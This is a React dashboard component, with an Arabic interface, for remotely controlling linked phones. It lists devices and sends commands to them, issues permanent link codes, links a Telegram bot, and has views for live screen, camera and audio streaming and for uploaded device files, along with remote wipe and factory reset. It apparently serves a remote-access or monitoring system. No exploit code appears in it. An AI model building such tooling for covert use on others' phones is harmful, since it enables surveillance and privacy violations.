'use client'

import React, { useState, useEffect, useRef } from 'react'
import { toast } from 'sonner'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Smartphone,
  Battery,
  BatteryCharging,
  Wifi,
  Users,
  Activity,
  Terminal,
  Copy,
  Check,
  X,
  ChevronDown,
  LogOut,
  Plus,
  Trash2,
  AlertTriangle,
  Send,
  RefreshCw,
  Eye,
  Monitor,
  Loader2,
  Link2,
  SmartphoneNfc,
  ListChecks,
  Radio,
  MessageCircle,
  ExternalLink,
  Search,
} from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from '@/components/ui/dialog'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import {
  DropdownMenu,
  DropdownMenuTrigger,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuSeparator,
} from '@/components/ui/dropdown-menu'
import { CMD_CATEGORIES, type CommandDef } from '@/lib/commands'
import api, { type Device, type Event, type Stats } from '@/lib/api'
import { cn, formatTimestamp, timeAgo, addLog } from '@/lib/utils'
import { useAuth } from '@/contexts/AuthContext'
import CommandResults from '@/components/dashboard/command-results'
import FileViewer from '@/components/dashboard/file-viewer'
import Sidebar, { MobileSidebarTrigger, type DashboardView } from '@/components/dashboard/sidebar'
import OverviewView from '@/components/dashboard/views/overview'
import StreamingView from '@/components/dashboard/views/streaming-view'
import SettingsView from '@/components/dashboard/views/settings-view'

/* ─── Types ──────────────────────────────────────────── */
interface UserData {
  id: string
  email: string
  username: string
  role: string
  created_at: string
}

/* ─── Skeleton helpers ───────────────────────────────── */
function Skeleton({ className }: { className?: string }) {
  return (
    <div
      className={cn('animate-pulse rounded-lg bg-slate-800/60', className)}
    />
  )
}

function DeviceCardSkeleton() {
  return (
    <div className="bg-slate-900/80 border border-slate-800/50 rounded-xl p-4 space-y-3">
      <div className="flex items-center justify-between">
        <Skeleton className="h-5 w-28" />
        <Skeleton className="h-5 w-16 rounded-full" />
      </div>
      <Skeleton className="h-4 w-36" />
      <Skeleton className="h-4 w-24" />
      <div className="flex items-center justify-between pt-2">
        <Skeleton className="h-4 w-20" />
        <Skeleton className="h-4 w-28" />
      </div>
    </div>
  )
}

/* ─── Main Dashboard ─────────────────────────────────── */
export default function Dashboard() {
  const { user, logout } = useAuth()

  /* ── Data State ── */
  const [devices, setDevices] = useState<Device[]>([])
  const [stats, setStats] = useState<Stats | null>(null)
  const [events, setEvents] = useState<Event[]>([])
  const [users, setUsers] = useState<UserData[]>([])
  const [permanentCode, setPermanentCode] = useState<string>('')

  /* ── UI State ── */
  const [activeView, setActiveView] = useState<DashboardView>('overview')
  const [loadingDevices, setLoadingDevices] = useState(true)
  const [loadingStats, setLoadingStats] = useState(true)
  const [loadingEvents, setLoadingEvents] = useState(true)
  const [loadingUsers, setLoadingUsers] = useState(false)
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null)
  const [activeCategory, setActiveCategory] = useState('data')
  const [commandLoading, setCommandLoading] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  const [showPermanentCode, setShowPermanentCode] = useState(false)
  const [linkCodeLoading, setLinkCodeLoading] = useState(false)
  const [tgLinkLoading, setTgLinkLoading] = useState(false)
  const [sidebarOpen, setSidebarOpen] = useState(false)
  const [commandSearch, setCommandSearch] = useState('')
  const [tgLinkDialog, setTgLinkDialog] = useState<{
    open: boolean
    deep_link_url: string
    bot_username: string
    expires_in: number
  }>({ open: false, deep_link_url: '', bot_username: '', expires_in: 600 })
  const [tgLinkCopied, setTgLinkCopied] = useState(false)

  /* ── Dialog State ── */
  const [paramDialog, setParamDialog] = useState<{
    open: boolean
    command: CommandDef | null
    values: Record<string, string>
  }>({ open: false, command: null, values: {} })

  const [confirmDialog, setConfirmDialog] = useState<{
    open: boolean
    command: CommandDef | null
  }>({ open: false, command: null })

  const [deleteDialog, setDeleteDialog] = useState<{
    open: boolean
    user: UserData | null
  }>({ open: false, user: null })

  const refreshTimerRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const selectedDeviceRef = useRef<Device | null>(null)

  // Keep ref in sync via effect
  useEffect(() => {
    selectedDeviceRef.current = selectedDevice
  }, [selectedDevice])

  /* ── Data Fetching ── */
  useEffect(() => {
    let cancelled = false
    addLog('info', 'بدء تحميل لوحة التحكم')

    async function loadInitialData() {
      // Devices
      try {
        const res = await api.getDevices()
        if (cancelled) return
        if (res.ok && res.devices) {
          setDevices(res.devices as Device[])
          addLog('success', `تم تحميل ${(res.devices as Device[]).length} جهاز`)
        } else {
          addLog('error', 'فشل تحميل الأجهزة', res.message)
        }
      } catch (err: unknown) {
        if (cancelled) return
        const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
        addLog('error', 'خطأ في تحميل الأجهزة', msg)
      } finally {
        if (!cancelled) setLoadingDevices(false)
      }

      // Stats
      try {
        const res = await api.getStats()
        if (cancelled) return
        if (res.ok && res.stats) {
          setStats(res.stats as Stats)
          addLog('info', 'تم تحميل الإحصائيات')
        } else {
          addLog('error', 'فشل تحميل الإحصائيات', res.message)
        }
      } catch (err: unknown) {
        if (cancelled) return
        const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
        addLog('error', 'خطأ في تحميل الإحصائيات', msg)
      } finally {
        if (!cancelled) setLoadingStats(false)
      }

      // Events
      try {
        const res = await api.getEvents(100)
        if (cancelled) return
        if (res.ok && res.events) {
          setEvents(res.events as Event[])
          addLog('info', `تم تحميل ${(res.events as Event[]).length} حدث`)
        } else {
          addLog('error', 'فشل تحميل الأحداث', res.message)
        }
      } catch (err: unknown) {
        if (cancelled) return
        const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
        addLog('error', 'خطأ في تحميل الأحداث', msg)
      } finally {
        if (!cancelled) setLoadingEvents(false)
      }
    }

    loadInitialData()
    return () => { cancelled = true }
  }, [])

  /* ── Auto Refresh Devices every 15s ── */
  useEffect(() => {
    refreshTimerRef.current = setInterval(async () => {
      try {
        const res = await api.getDevices()
        if (res.ok && res.devices) {
          setDevices(res.devices as Device[])
        }
      } catch {
        // silent refresh
      }
    }, 15000)
    return () => {
      if (refreshTimerRef.current) clearInterval(refreshTimerRef.current)
    }
  }, [])

  /* ── Load Users when Users view is active ── */
  useEffect(() => {
    if (activeView !== 'users' || user?.role !== 'admin') return
    let cancelled = false

    ;(async () => {
      setLoadingUsers(true)
      try {
        const res = await api.getUsers()
        if (cancelled) return
        if (res.ok && res.users) {
          setUsers(res.users as UserData[])
          addLog('info', `تم تحميل ${(res.users as UserData[]).length} مستخدم`)
        } else {
          addLog('error', 'فشل تحميل المستخدمين', res.message)
        }
      } catch (err: unknown) {
        if (cancelled) return
        const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
        addLog('error', 'خطأ في تحميل المستخدمين', msg)
      } finally {
        if (!cancelled) setLoadingUsers(false)
      }
    })()

    return () => { cancelled = true }
  }, [activeView, user?.role])

  /* ── Handlers ── */
  const handleSelectDevice = (device: Device) => {
    setSelectedDevice(device)
    addLog('info', `تم اختيار الجهاز: ${device.name}`, `الموديل: ${device.model}`)
  }

  const handleGenerateLinkCode = async () => {
    setLinkCodeLoading(true)
    addLog('info', 'جارِ الحصول على كود الربط الخاص بك...')
    try {
      const res = await api.generateLinkCode()
      if (res.ok && res.code) {
        const code = res.code
        setPermanentCode(code)
        setShowPermanentCode(true)
        addLog('success', 'كود الربط الخاص بك', `الكود: ${code} — صالح مدى الحياة`)
      } else {
        addLog('error', 'فشل الحصول على كود الربط', res.message)
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
      addLog('error', 'خطأ في الحصول على كود الربط', msg)
    } finally {
      setLinkCodeLoading(false)
    }
  }

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true)
      addLog('info', 'تم نسخ النص للحافظة')
      setTimeout(() => setCopied(false), 2000)
    }).catch(() => {
      addLog('error', 'فشل نسخ النص للحافظة')
    })
  }

  const handleGenerateTgLink = async () => {
    setTgLinkLoading(true)
    addLog('info', 'جارِ توليد رابط ربط Telegram...')
    try {
      const res = await api.getTgLinkToken()
      if (res.ok && res.deep_link_url) {
        setTgLinkDialog({
          open: true,
          deep_link_url: res.deep_link_url,
          bot_username: res.bot_username || '',
          expires_in: res.expires_in || 600,
        })
        setTgLinkCopied(false)
        addLog('success', 'تم توليد رابط ربط Telegram', `البوت: @${res.bot_username}`)
      } else if (res.ok && res.token && !res.deep_link_url) {
        addLog('warning', 'لم يتم جلب اسم البوت بعد. أعد المحاولة خلال لحظات.', res.message || '')
      } else {
        addLog('error', 'فشل توليد رابط ربط Telegram', res.message)
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
      addLog('error', 'خطأ في توليد رابط ربط Telegram', msg)
    } finally {
      setTgLinkLoading(false)
    }
  }

  const handleCopyTgLink = (url: string) => {
    navigator.clipboard.writeText(url).then(() => {
      setTgLinkCopied(true)
      addLog('info', 'تم نسخ رابط ربط Telegram')
      setTimeout(() => setTgLinkCopied(false), 2000)
    }).catch(() => {
      addLog('error', 'فشل نسخ الرابط')
    })
  }

  const handleSendCommand = async (cmd: string, extraParams?: Record<string, string | number>) => {
    const device = selectedDeviceRef.current
    if (!device) return
    setCommandLoading(cmd)
    addLog('info', `إرسال الأمر: ${cmd}`, `الجهاز: ${device.name}`)

    try {
      const params = extraParams || undefined
      const res = await api.sendCommand(device.id, cmd, params)
      if (res.ok) {
        addLog('success', `تم إرسال الأمر بنجاح: ${cmd}`, res.message || '')
        toast.success(`تم إرسال الأمر: ${cmd}`, { description: 'سيظهر في تبويب النتائج' })
        // Auto-navigate to results tab so user sees the result
        setActiveView('results')
      } else {
        addLog('error', `فشل إرسال الأمر: ${cmd}`, res.message || 'خطأ من الخادم')
        toast.error(`فشل إرسال الأمر: ${cmd}`, { description: res.message || 'خطأ من الخادم' })
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
      addLog('error', `خطأ في إرسال الأمر: ${cmd}`, msg)
      toast.error(`خطأ في إرسال الأمر: ${cmd}`, { description: msg })
    } finally {
      setCommandLoading(null)
    }
  }

  const handleCommandClick = (command: CommandDef) => {
    if (!selectedDevice) {
      addLog('warning', 'لم يتم اختيار جهاز')
      return
    }

    // Security commands need confirmation
    if (command.cmd === 'wipe_data' || command.cmd === 'factory_reset') {
      setConfirmDialog({ open: true, command })
      addLog('warning', `طلب تأكيد لأمر خطير: ${command.name}`)
      return
    }

    // Commands with params need param dialog
    if (command.hasParams && command.paramFields && command.paramFields.length > 0) {
      const initial: Record<string, string> = {}
      command.paramFields.forEach((f) => {
        initial[f.key] = ''
      })
      setParamDialog({ open: true, command, values: initial })
      addLog('info', `فتح حوار المعلمات: ${command.name}`)
      return
    }

    // Send command without params
    handleSendCommand(command.cmd, command.params)
  }

  const handleSendWithParams = () => {
    if (!paramDialog.command) return
    const { command, values } = paramDialog
    const allParams: Record<string, string | number> = { ...(command.params as Record<string, string | number>), ...values }
    handleSendCommand(command.cmd, allParams)
    setParamDialog({ open: false, command: null, values: {} })
  }

  const handleConfirmSecurity = () => {
    if (!confirmDialog.command) return
    handleSendCommand(confirmDialog.command.cmd)
    setConfirmDialog({ open: false, command: null })
  }

  const handleDeleteUser = async (userId: string) => {
    try {
      const res = await api.deleteUser(userId)
      if (res.ok) {
        addLog('success', 'تم حذف المستخدم بنجاح')
        const usersRes = await api.getUsers()
        if (usersRes.ok && usersRes.users) {
          setUsers(usersRes.users as UserData[])
        }
      } else {
        addLog('error', 'فشل حذف المستخدم', res.message)
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'خطأ غير معروف'
      addLog('error', 'خطأ في حذف المستخدم', msg)
    }
    setDeleteDialog({ open: false, user: null })
  }

  const handleRefreshAll = () => {
    setLoadingDevices(true)
    setLoadingStats(true)
    setLoadingEvents(true)
    Promise.all([
      api.getDevices(),
      api.getStats(),
      api.getEvents(100),
    ]).then(([devRes, statsRes, evtRes]) => {
      if (devRes.ok && devRes.devices) setDevices(devRes.devices as Device[])
      if (statsRes.ok && statsRes.stats) setStats(statsRes.stats as Stats)
      if (evtRes.ok && evtRes.events) setEvents(evtRes.events as Event[])
    }).catch(() => {
      addLog('error', 'فشل تحديث البيانات')
    }).finally(() => {
      setLoadingDevices(false)
      setLoadingStats(false)
      setLoadingEvents(false)
    })
  }

  const handleLogout = () => {
    addLog('info', 'تسجيل الخروج', `المستخدم: ${user?.username}`)
    api.logout().catch(() => {})
    logout()
  }

  /* ─── Page title for header ─── */
  const viewTitles: Record<DashboardView, { title: string; subtitle: string }> = {
    overview: { title: 'لوحة المعلومات', subtitle: 'نظرة شاملة على النظام' },
    devices: { title: 'الأجهزة', subtitle: 'إدارة الأجهزة المتصلة' },
    commands: { title: 'الأوامر', subtitle: 'مكتبة أوامر الجهاز' },
    results: { title: 'النتائج', subtitle: 'نتائج الأوامر المُرسلة' },
    streaming: { title: 'البث المباشر', subtitle: 'بث الشاشة والكاميرا والصوت' },
    files: { title: 'الملفات', subtitle: 'الملفات المرفوعة من الأجهزة' },
    events: { title: 'الأحداث', subtitle: 'سجل أحداث النظام' },
    users: { title: 'المستخدمين', subtitle: 'إدارة حسابات النظام' },
    settings: { title: 'الإعدادات', subtitle: 'إعدادات النظام والتنبيهات' },
  }

  /* ─── Render: Top bar (mobile hamburger + page title + actions) ─── */
  const renderTopBar = () => {
    const vt = viewTitles[activeView]
    return (
      <header className="sticky top-0 z-30 w-full border-b border-slate-800/60 bg-slate-950/90 backdrop-blur-xl">
        <div className="flex items-center justify-between px-4 py-3 md:px-6 gap-3">
          {/* Right side: hamburger + page title */}
          <div className="flex items-center gap-3 min-w-0">
            <MobileSidebarTrigger onClick={() => setSidebarOpen(true)} />
            <div className="min-w-0">
              <h1 className="text-base sm:text-lg font-bold text-white truncate">
                {vt.title}
              </h1>
              <p className="text-[11px] text-slate-400 truncate hidden sm:block">
                {vt.subtitle}
              </p>
            </div>
          </div>

          {/* Left side: actions */}
          <div className="flex items-center gap-2 shrink-0">
            {/* Permanent Code Display */}
            <AnimatePresence>
              {showPermanentCode && permanentCode && (
                <motion.div
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.9 }}
                  className="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20"
                >
                  <Link2 className="w-3.5 h-3.5 text-emerald-400" />
                  <span className="text-xs text-emerald-300 font-mono" dir="ltr">
                    {permanentCode}
                  </span>
                  <button
                    type="button"
                    onClick={() => handleCopy(permanentCode)}
                    className="text-emerald-400 hover:text-emerald-300 transition-colors"
                  >
                    {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                  </button>
                  <button
                    type="button"
                    onClick={() => setShowPermanentCode(false)}
                    className="text-slate-400 hover:text-slate-300 transition-colors"
                  >
                    <X className="w-3 h-3" />
                  </button>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Selected device quick badge */}
            {selectedDevice && (activeView === 'commands' || activeView === 'results' || activeView === 'streaming') && (
              <div className="hidden md:flex items-center gap-2 px-2.5 py-1 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                <Smartphone className="w-3 h-3 text-emerald-400" />
                <span className="text-xs text-emerald-300 truncate max-w-[120px]">
                  {selectedDevice.name}
                </span>
              </div>
            )}

            {/* User Dropdown */}
            <DropdownMenu>
              <DropdownMenuTrigger
                render={
                  <button
                    type="button"
                    className="flex items-center gap-2 px-2 py-1.5 rounded-lg hover:bg-slate-800/60 transition-colors outline-none cursor-pointer"
                  />
                }
              >
                <div className="w-8 h-8 rounded-full bg-gradient-to-br from-emerald-500 to-emerald-600 flex items-center justify-center text-white text-sm font-bold">
                  {user?.username?.charAt(0)?.toUpperCase() || 'م'}
                </div>
                <span className="hidden sm:block text-sm text-slate-200 font-medium max-w-[100px] truncate">
                  {user?.username || 'مستخدم'}
                </span>
                <ChevronDown className="w-4 h-4 text-slate-400" />
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" sideOffset={8}>
                <DropdownMenuItem
                  onClick={handleGenerateLinkCode}
                  disabled={linkCodeLoading}
                >
                  {linkCodeLoading ? (
                    <Loader2 className="w-4 h-4 animate-spin" />
                  ) : (
                    <Plus className="w-4 h-4" />
                  )}
                  كود الربط الخاص بي
                </DropdownMenuItem>
                <DropdownMenuItem
                  onClick={handleGenerateTgLink}
                  disabled={tgLinkLoading}
                >
                  {tgLinkLoading ? (
                    <Loader2 className="w-4 h-4 animate-spin" />
                  ) : (
                    <MessageCircle className="w-4 h-4" />
                  )}
                  ربط بوت Telegram
                </DropdownMenuItem>
                <DropdownMenuItem
                  onClick={() => setActiveView('settings')}
                >
                  <Terminal className="w-4 h-4" />
                  الإعدادات
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  variant="destructive"
                  onClick={handleLogout}
                >
                  <LogOut className="w-4 h-4" />
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>
    )
  }

  /* ─── Render: Device Card ─── */
  const renderDeviceCard = (device: Device) => {
    const isSelected = selectedDevice?.id === device.id
    return (
      <motion.div
        key={device.id}
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.2 }}
      >
        <button
          type="button"
          onClick={() => handleSelectDevice(device)}
          className={cn(
            'w-full text-right bg-white/5 backdrop-blur-md border rounded-xl p-4 transition-all duration-200',
            'hover:bg-white/[0.07] hover:border-emerald-500/30 hover:shadow-lg hover:shadow-emerald-500/5',
            isSelected
              ? 'border-emerald-500/50 ring-1 ring-emerald-500/20 bg-emerald-500/5'
              : 'border-slate-800/60'
          )}
        >
          {/* Header */}
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2 min-w-0">
              <div className={cn(
                'p-1.5 rounded-lg shrink-0',
                device.is_online ? 'bg-green-500/15' : 'bg-slate-700/50'
              )}>
                <Smartphone className={cn(
                  'w-4 h-4',
                  device.is_online ? 'text-green-400' : 'text-slate-500'
                )} />
              </div>
              <div className="min-w-0">
                <p className="text-white text-sm font-medium truncate">
                  {device.name}
                </p>
                <p className="text-slate-400 text-xs truncate">
                  {device.model} • {device.brand}
                </p>
              </div>
            </div>
            <Badge className={cn(
              'text-[10px] shrink-0',
              device.is_online
                ? 'bg-green-500/15 text-green-400 border-green-500/25'
                : 'bg-slate-700/50 text-slate-400 border-slate-600/30'
            )}>
              {device.is_online ? 'متصل' : 'غير متصل'}
            </Badge>
          </div>

          {/* Info Row */}
          <div className="flex items-center gap-4 text-xs text-slate-400">
            <div className="flex items-center gap-1.5">
              {device.is_charging ? (
                <BatteryCharging className="w-3.5 h-3.5 text-emerald-400" />
              ) : (
                <Battery className="w-3.5 h-3.5" />
              )}
              <span>{device.battery_level}%</span>
            </div>
            <span className="truncate">{timeAgo(device.last_seen)}</span>
          </div>

          {/* IP */}
          <div className="flex items-center gap-1.5 text-xs text-slate-500 mt-2">
            <Monitor className="w-3 h-3" />
            <span className="font-mono" dir="ltr">{device.ip_address}</span>
          </div>
        </button>
      </motion.div>
    )
  }

  /* ─── Render: Devices View ─── */
  const renderDevicesView = () => (
    <div className="space-y-6">
      {/* Page header */}
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <h1 className="text-2xl font-bold text-white">الأجهزة</h1>
          <p className="text-sm text-slate-400 mt-1">
            إدارة الأجهزة المتصلة بحسابك
          </p>
        </div>
        <div className="flex items-center gap-2">
          <Button
            variant="ghost"
            size="sm"
            onClick={() => {
              addLog('info', 'تحديث قائمة الأجهزة يدوياً')
              setLoadingDevices(true)
              api.getDevices().then(res => {
                if (res.ok && res.devices) setDevices(res.devices as Device[])
                setLoadingDevices(false)
              }).catch(() => setLoadingDevices(false))
            }}
            disabled={loadingDevices}
            className="text-slate-400 hover:text-white hover:bg-slate-800"
          >
            <RefreshCw className={cn('w-4 h-4', loadingDevices && 'animate-spin')} />
            <span>تحديث</span>
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={handleGenerateLinkCode}
            disabled={linkCodeLoading}
            className="border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/10 hover:text-emerald-300 bg-transparent"
          >
            {linkCodeLoading ? (
              <Loader2 className="w-4 h-4 animate-spin" />
            ) : (
              <Plus className="w-4 h-4" />
            )}
            <span className="hidden sm:inline">كود الربط</span>
          </Button>
        </div>
      </div>

      {/* Device count badge */}
      <div className="flex items-center gap-3 text-sm">
        <Badge className="bg-emerald-500/15 text-emerald-400 border-emerald-500/25 gap-1">
          <Smartphone className="w-3 h-3" />
          {devices.length} جهاز
        </Badge>
        <Badge className="bg-green-500/15 text-green-400 border-green-500/25 gap-1">
          <Wifi className="w-3 h-3" />
          {devices.filter(d => d.is_online).length} متصل
        </Badge>
      </div>

      {/* Device Grid */}
      {loadingDevices ? (
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
          {Array.from({ length: 6 }).map((_, i) => (
            <DeviceCardSkeleton key={i} />
          ))}
        </div>
      ) : devices.length === 0 ? (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="flex flex-col items-center justify-center py-16 text-slate-400 bg-white/5 backdrop-blur-md border border-slate-800/60 rounded-xl"
        >
          <SmartphoneNfc className="w-12 h-12 mb-3 text-slate-600" />
          <p className="text-base font-medium">لا توجد أجهزة متصلة</p>
          <p className="text-sm mt-1">استخدم كود الربط لربط جهاز جديد</p>
          <Button
            variant="outline"
            size="sm"
            onClick={handleGenerateLinkCode}
            disabled={linkCodeLoading}
            className="mt-4 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/10 bg-transparent"
          >
            {linkCodeLoading ? (
              <Loader2 className="w-4 h-4 animate-spin" />
            ) : (
              <Plus className="w-4 h-4" />
            )}
            الحصول على كود الربط
          </Button>
        </motion.div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
          {devices.map(renderDeviceCard)}
        </div>
      )}

      {/* Selected device actions */}
      {selectedDevice && (
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white/5 backdrop-blur-md border border-emerald-500/20 rounded-xl p-4"
        >
          <div className="flex items-center gap-3 mb-3">
            <div className="p-2 rounded-lg bg-emerald-500/15 shrink-0">
              <Smartphone className="w-5 h-5 text-emerald-400" />
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-sm text-white font-medium truncate">
                الجهاز المُختار: {selectedDevice.name}
              </p>
              <p className="text-xs text-slate-400 truncate">
                {selectedDevice.model} • {selectedDevice.brand}
              </p>
            </div>
            <Button
              variant="ghost"
              size="icon-xs"
              onClick={() => {
                setSelectedDevice(null)
                addLog('info', 'تم إلغاء اختيار الجهاز')
              }}
              className="text-slate-400 hover:text-white hover:bg-slate-700"
            >
              <X className="w-4 h-4" />
            </Button>
          </div>
          <div className="flex items-center gap-2 flex-wrap">
            <Button
              size="sm"
              onClick={() => setActiveView('commands')}
              className="bg-emerald-600 hover:bg-emerald-500 text-white"
            >
              <Terminal className="w-4 h-4" />
              عرض الأوامر
            </Button>
            <Button
              size="sm"
              variant="outline"
              onClick={() => setActiveView('streaming')}
              className="border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/10 bg-transparent"
            >
              <Radio className="w-4 h-4" />
              البث المباشر
            </Button>
            <Button
              size="sm"
              variant="outline"
              onClick={() => setActiveView('results')}
              className="border-slate-700 text-slate-300 hover:bg-slate-800 bg-transparent"
            >
              <ListChecks className="w-4 h-4" />
              النتائج
            </Button>
          </div>
        </motion.div>
      )}
    </div>
  )

  /* ─── Render: Commands View ─── */
  const renderCommandsView = () => {
    if (!selectedDevice) {
      return (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="flex flex-col items-center justify-center py-16 text-slate-400 bg-white/5 backdrop-blur-md border border-slate-800/60 rounded-xl"
        >
          <Eye className="w-12 h-12 mb-3 text-slate-600" />
          <p className="text-base font-medium">اختر جهازاً لعرض الأوامر</p>
          <p className="text-sm mt-1">انتقل إلى صفحة الأجهزة واختر جهازاً</p>
          <Button
            variant="outline"
            size="sm"
            onClick={() => setActiveView('devices')}
            className="mt-4 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/10 bg-transparent"
          >
            <Smartphone className="w-4 h-4" />
            عرض الأجهزة
          </Button>
        </motion.div>
      )
    }

    const categoryKeys = Object.keys(CMD_CATEGORIES)
    const currentCategory = CMD_CATEGORIES[activeCategory]
    let commands = currentCategory ? Object.values(currentCategory.commands) : []

    // Filter by search query
    if (commandSearch.trim()) {
      const q = commandSearch.trim().toLowerCase()
      commands = commands.filter(
        (c) => c.name.toLowerCase().includes(q) || c.cmd.toLowerCase().includes(q)
      )
    }

    return (
      <div className="space-y-4">
        {/* Selected device info */}
        <div className="flex items-center gap-3 p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
          <div className="p-1.5 rounded-lg bg-emerald-500/15">
            <Smartphone className="w-4 h-4 text-emerald-400" />
          </div>
          <div className="min-w-0 flex-1">
            <p className="text-white text-sm font-medium truncate">
              {selectedDevice.name}
            </p>
            <p className="text-slate-400 text-xs truncate">
              {selectedDevice.model} • {selectedDevice.brand}
            </p>
          </div>
          <Badge className={cn(
            'text-[10px]',
            selectedDevice.is_online
              ? 'bg-green-500/15 text-green-400 border-green-500/25'
              : 'bg-red-500/15 text-red-400 border-red-500/25'
          )}>
            {selectedDevice.is_online ? 'متصل' : 'غير متصل'}
          </Badge>
          <Button
            variant="ghost"
            size="icon-xs"
            onClick={() => {
              setSelectedDevice(null)
              addLog('info', 'تم إلغاء اختيار الجهاز')
            }}
            className="text-slate-400 hover:text-white hover:bg-slate-700"
          >
            <X className="w-4 h-4" />
          </Button>
        </div>

        {/* Search box */}
        <div className="relative">
          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
          <Input
            type="text"
            value={commandSearch}
            onChange={(e) => setCommandSearch(e.target.value)}
            placeholder="ابحث عن أمر..."
            className="pr-9 bg-slate-800/50 border-slate-700/60 text-white placeholder:text-slate-500 focus-visible:border-emerald-500/50 focus-visible:ring-emerald-500/20"
          />
          {commandSearch && (
            <button
              type="button"
              onClick={() => setCommandSearch('')}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300"
            >
              <X className="w-3.5 h-3.5" />
            </button>
          )}
        </div>

        {/* Category Chips */}
        <div className="flex gap-2 overflow-x-auto pb-1" style={{ scrollbarWidth: 'none' }}>
          {categoryKeys.map((key) => {
            const cat = CMD_CATEGORIES[key]
            const isActive = activeCategory === key
            const count = Object.keys(cat.commands).length
            return (
              <button
                key={key}
                type="button"
                onClick={() => {
                  setActiveCategory(key)
                  setCommandSearch('')
                  addLog('info', `تبديل الفئة: ${cat.name}`)
                }}
                className={cn(
                  'flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-medium whitespace-nowrap transition-all duration-200 border',
                  isActive
                    ? 'bg-emerald-500/15 text-emerald-300 border-emerald-500/30'
                    : 'bg-slate-800/50 text-slate-400 border-slate-700/50 hover:bg-slate-700/50 hover:text-slate-300'
                )}
              >
                <span>{cat.icon}</span>
                <span>{cat.name}</span>
                <span className="text-[9px] text-slate-500">({count})</span>
              </button>
            )
          })}
        </div>

        {/* Command count */}
        <div className="flex items-center justify-between">
          <p className="text-xs text-slate-500">
            {commands.length} أمر متاح
            {commandSearch && ` • نتائج البحث عن "${commandSearch}"`}
          </p>
        </div>

        {/* Command Buttons Grid */}
        {commands.length === 0 ? (
          <div className="text-center py-8 text-slate-500 text-sm">
            لا توجد أوامر مطابقة
          </div>
        ) : (
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-2">
            {commands.map((cmd) => {
              const isLoading = commandLoading === cmd.cmd
              const isDangerous = cmd.category === 'security' && (cmd.cmd === 'wipe_data' || cmd.cmd === 'factory_reset')
              return (
                <motion.button
                  key={cmd.cmd}
                  type="button"
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={() => handleCommandClick(cmd)}
                  disabled={isLoading}
                  className={cn(
                    'flex flex-col items-center gap-1.5 p-3 rounded-xl border transition-all duration-200',
                    'bg-slate-900/60 border-slate-800/50 backdrop-blur-sm',
                    'hover:bg-slate-800/80 hover:border-emerald-500/30',
                    'disabled:opacity-50 disabled:cursor-not-allowed',
                    isDangerous && 'hover:border-red-500/30 hover:bg-red-500/5'
                  )}
                >
                  <span className="text-lg">{cmd.icon}</span>
                  <span className="text-xs text-slate-300 text-center leading-tight">
                    {isLoading ? (
                      <Loader2 className="w-3.5 h-3.5 animate-spin text-emerald-400 mx-auto" />
                    ) : (
                      cmd.name
                    )}
                  </span>
                  {cmd.hasParams && (
                    <span className="text-[9px] text-emerald-500/70">معلمات</span>
                  )}
                </motion.button>
              )
            })}
          </div>
        )}
      </div>
    )
  }

  /* ─── Render: Events View ─── */
  const renderEventsView = () => {
    const levelColors: Record<string, string> = {
      info: 'bg-cyan-500/15 text-cyan-400 border-cyan-500/25',
      success: 'bg-emerald-500/15 text-emerald-400 border-emerald-500/25',
      warning: 'bg-amber-500/15 text-amber-400 border-amber-500/25',
      error: 'bg-red-500/15 text-red-400 border-red-500/25',
